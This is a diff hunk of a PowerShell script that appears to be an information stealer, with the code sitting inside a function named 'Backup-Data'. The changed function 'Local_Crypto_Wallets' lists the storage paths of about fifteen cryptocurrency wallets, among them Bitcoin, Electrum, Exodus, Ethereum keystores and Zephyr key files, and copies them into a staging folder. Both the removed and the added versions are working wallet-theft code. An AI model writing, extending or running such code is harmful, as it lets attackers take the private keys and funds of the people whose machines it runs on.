@@ -742,40 +742,37 @@ function Backup-Data {
     }
 
     function Local_Crypto_Wallets {
-        $wallet_paths = @{
-            "Local Wallets" = @{
-                "Armory"            = Join-Path $env:userprofile  "AppData\Roaming\Armory\*.wallet"
-                "Atomic"            = Join-Path $env:userprofile  "AppData\Roaming\Atomic\Local Storage\leveldb"
-                "Bitcoin"           = Join-Path $env:userprofile  "AppData\Roaming\Bitcoin\wallets"
-    			"Bytecoin"          = Join-Path $env:userprofile  "AppData\Roaming\bytecoin\*.wallet"
-                "Coinomi"           = Join-Path $env:localappdata "Coinomi\Coinomi\wallets"
-                "Dash"              = Join-Path $env:userprofile  "AppData\Roaming\DashCore\wallets"
-                "Electrum"          = Join-Path $env:userprofile  "AppData\Roaming\Electrum\wallets"
-                "Ethereum"          = Join-Path $env:userprofile  "AppData\Roaming\Ethereum\keystore"
-                "Exodus"            = Join-Path $env:userprofile  "AppData\Roaming\Exodus\exodus.wallet"
-                "Guarda"            = Join-Path $env:userprofile  "AppData\Roaming\Guarda\Local Storage\leveldb"
-                "com.liberty.jaxx"  = Join-Path $env:userprofile  "AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
-    			"Litecoin"          = Join-Path $env:userprofile  "AppData\Roaming\Litecoin\wallets"
-    			"MyMonero"          = Join-Path $env:userprofile  "AppData\Roaming\MyMonero\*.mmdbdoc_v1"
-    			"Monero GUI"        = Join-Path $env:userprofile  "Documents\Monero\wallets\"
-    			"Zephyr"             = Join-Path $env:userprofile  "AppData\Roaming\Zephyr\wallets"
+    $wallet_paths = @{
+                "Local Wallets" = @{
+                    "Armory"            = Join-Path $env:appdata      "\Armory\*.wallet"
+                    "Atomic"            = Join-Path $env:appdata      "\Atomic\Local Storage\leveldb"
+                    "Bitcoin"           = Join-Path $env:appdata      "\Bitcoin\wallets"
+        			"Bytecoin"          = Join-Path $env:appdata      "\bytecoin\*.wallet"
+                    "Coinomi"           = Join-Path $env:localappdata "Coinomi\Coinomi\wallets"
+                    "Dash"              = Join-Path $env:appdata      "\DashCore\wallets"
+                    "Electrum"          = Join-Path $env:appdata      "\Electrum\wallets"
+                    "Ethereum"          = Join-Path $env:appdata      "\Ethereum\keystore"
+                    "Exodus"            = Join-Path $env:appdata      "\Exodus\exodus.wallet"
+                    "Guarda"            = Join-Path $env:appdata      "\Guarda\Local Storage\leveldb"
+                    "com.liberty.jaxx"  = Join-Path $env:appdata      "\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
+        			"Litecoin"          = Join-Path $env:appdata      "\Litecoin\wallets"
+        			"MyMonero"          = Join-Path $env:appdata      "\MyMonero\*.mmdbdoc_v1"
+        			"Monero GUI"        = Join-Path $env:appdata      "Documents\Monero\wallets\"
+                }
             }
-        } 
-        foreach ($wallet in $wallet_paths.Keys) {
-        foreach ($pathName in $wallet_paths[$wallet].Keys) {
-            $sourcePath = $wallet_paths[$wallet][$pathName]
-			if ($wallet -eq "Zephyr") {
-                $files = Get-ChildItem -Path $sourcePath -Recurse -Filter "*.keys" -ErrorAction SilentlyContinue
-            } else {
-                $files = Get-ChildItem -Path $sourcePath -ErrorAction SilentlyContinue
-            }
-            if (Test-Path $sourcePath) {
-                $destination = Join-Path -Path $folder_crypto -ChildPath $pathName
-                New-Item -ItemType Directory -Path $destination -Force | Out-Null
-                Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
-            }
-         }
-      }
+            $zephyr_path = "$env:appdata\Zephyr\wallets"
+    		New-Item -ItemType Directory -Path "$folder_crypto\Zephyr" -Force | Out-Null
+            if (Test-Path $zephyr_path) {Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force	}	
+            foreach ($wallet in $wallet_paths.Keys) {
+            foreach ($pathName in $wallet_paths[$wallet].Keys) {
+                $sourcePath = $wallet_paths[$wallet][$pathName]
+                if (Test-Path $sourcePath) {
+                    $destination = Join-Path -Path $folder_crypto -ChildPath $pathName
+                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
+    				Copy-Item -Path $sourcePath -Recurse -Destination $destination -Force
+                }
+             }
+          }
     }
     Local_Crypto_Wallets
 	
